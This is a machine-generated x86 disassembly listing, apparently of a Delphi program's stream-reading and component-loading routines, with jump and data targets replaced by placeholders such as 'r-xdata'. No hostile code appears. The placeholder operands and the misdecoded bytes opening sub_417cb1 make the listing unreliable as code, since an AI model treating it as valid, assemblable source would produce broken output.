pop esi
pop ebx
retn
call sub_416b40
sub_416d9c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ rw-data ]
call sub_413df4
mov esi eax
xor edx edx
push ebp
push sub_416e0c
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416e13
mov eax [ rw-data ]
call sub_413e58
retn
mov edx ebx
mov eax esi
call sub_4139f4
mov edx [ eax + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ eax + 0xc ]
cmp edx [ edi + 0xc ]
jne r-xdata
call sub_4030f8
mov edx ebx
mov eax esi
call sub_4138e4
sub_416e18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_416f27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416f2e
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
xor edx edx
push ebp
push sub_416f0a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416f5c
retn
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx ]
mov eax ebx
call sub_41662c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4139f4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x14 ]
call sub_403f4c
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_416708
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4139f4
call sub_416d9c
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx esi
call sub_4139f4
mov edx eax
mov eax [ rw-data ]
call sub_413d6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx esi
call sub_413b40
jmp r-xdata
inc esi
dec [ ebp - 0xc ]
jne r-xdata
sub_416f38
push ebx
mov ebx eax
mov eax ebx
call sub_41702c
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_415a94
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
sub_416f5c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x30 ]
call sub_4030f8
xor eax eax
mov [ ebx + 0x30 ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x30 ]
call sub_4139f4
call sub_4030f8
inc edi
dec esi
jne r-xdata
sub_416f98
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] eax
mov eax edx
call sub_403040
mov ebp eax
jmp r-xdata
cmp ebp [ r-xdata ]
jne r-xdata
mov eax ebp
call sub_413088
mov esi eax
test esi esi
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x74 ]
test eax eax
je r-xdata
mov eax ebp
call sub_403084
mov ebp eax
movsx ebx [ esi ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp + 0x4 ]
call sub_413100
mov edi eax
mov edx [ esp + 0x4 ]
call sub_413000
mov edi eax
jmp r-xdata
inc ebx
mov [ esp + 0x8 ] 0x0
mov eax edi
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ esp + 0x8 ]
dec ebx
jne r-xdata
mov eax [ esp + 0x8 ]
mov eax [ esi + eax * 4 + 0x2 ]
mov edi [ eax ]
mov edx [ esp + 0x4 ]
mov eax edi
call sub_40305c
test al al
jne r-xdata
sub_417068
push esi
push edi
push ebx
mov edi edx
mov ebx ecx
mov esi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
sub ecx [ esi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax esi
call sub_4170b4
mov ecx [ esi + 0x14 ]
push esi
sub ebx ecx
mov eax [ esi + 0x8 ]
add eax [ esi + 0x10 ]
add [ esi + 0x10 ] ecx
mov esi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
mov ecx ebx
sub_4170b4
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
jne r-xdata
xor eax eax
mov [ ebx + 0x10 ] eax
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
sub_417104
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41714f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418904
mov eax [ ebp - 0x4 ]
call sub_404174
dec eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417156
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
call sub_416b40
sub_41715c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_4171fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416d00
test al al
jne r-xdata
mov eax ebx
call sub_416d00
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_414598
jmp r-xdata
mov eax ebx
call sub_417044
add al 0xfe
sub al 0x3
jae r-xdata
mov eax ebx
call sub_417c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417203
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
call sub_414568
mov esi eax
mov eax ebx
call sub_417c64
jmp r-xdata
mov eax ebx
call sub_417bb4
mov eax ebx
call sub_416d00
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_417dd0
mov eax ebx
call sub_417c6c
sub_41722c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x34 ]
call sub_413898
inc esi
dec ebx
jne r-xdata
sub_417268
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_41a300
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c7c
inc eax
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov ecx 0x1
mov edx [ r-xdata ]
call sub_404e38
add esp 0x4
mov edx ebx
mov eax edi
call sub_41a2d4
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c7c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
pop ecx
mov [ edx + eax * 4 - 0x4 ] ecx
mov edx ebx
mov eax edi
call sub_41a2d4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_4172e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_404c7c
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ ebp - 0x2 ]
not eax
and ax [ edi + 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_417348
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_417368
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_40275c
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_417348
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_418d98
call sub_40275c
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_4030f8
sub_4173c8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4174ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418f38
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_417482
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_4174b3
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417368
pop ecx
test al al
jne r-xdata
call sub_4038e8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403894
sub_4174d8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_417550
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_4032f4
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_413540
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_417555
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417368
pop ecx
test al al
jne r-xdata
call sub_4038e8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403894
sub_417578
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4175f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_418f38
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_4032f4
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4175f8
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_417368
pop ecx
test al al
jne r-xdata
call sub_4038e8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403894
sub_41761c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41783d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_4188c8
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_4188c8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41780d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_4177cb
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_417268
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_4172e0
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_4173c8
pop ecx
push ebp
call sub_417578
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_4174d8
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403918
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_4172e0
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_4172e0
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417844
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404e44
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_4032f4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413a50
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41722c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413898
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41722c
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413898
sub_4177d0
push ebp
call sub_417348
pop ecx
test al al
je r-xdata
call sub_403894
call sub_4038e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_4030f8
sub_417858
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4178c8
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_4178b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4178c8
mov eax [ ebp - 0x4 ]
call sub_416e18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416f5c
retn
sub_4178c8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d00
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417dd0
mov eax [ ebp - 0x4 ]
call sub_417c6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_4032f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41798a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_4032f4
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416d00
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41761c
mov eax [ ebp - 0x4 ]
call sub_417c6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417991
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417998
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_418aa4
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417c20
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_417068
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_4179dc
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_418aa4
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417c20
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417068
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_417a20
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418aa4
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417c20
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417068
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_417a70
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418aa4
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_417c20
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417068
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_417ab4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_418aa4
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_416b40
mov al [ eax + lookup_table_417adb ]
jmp [ eax * 4 + jump_table_417ae9 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_417068
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fa4
mov eax esi
call j_sub_404380
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_417068
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f08
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f08
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f08
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f08
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_417bb4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_418aa4
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_417068
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_417068
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_417068
jmp r-xdata
jmp r-xdata
call sub_416b40
sub_417c20
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_417044
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_417bb4
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_418aa4
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_417068
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417c74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_417044
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_418aa4
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_417bb4
mov [ edi ] eax
sub_417cb1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417da5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403eb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f4c
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417dac
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403048
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404118
sub_417dd0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417fa0
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_4036ac#7
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_4188c8
xor edx edx
push ebp
push j_sub_4036ac#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404174
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4043d4
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_403320
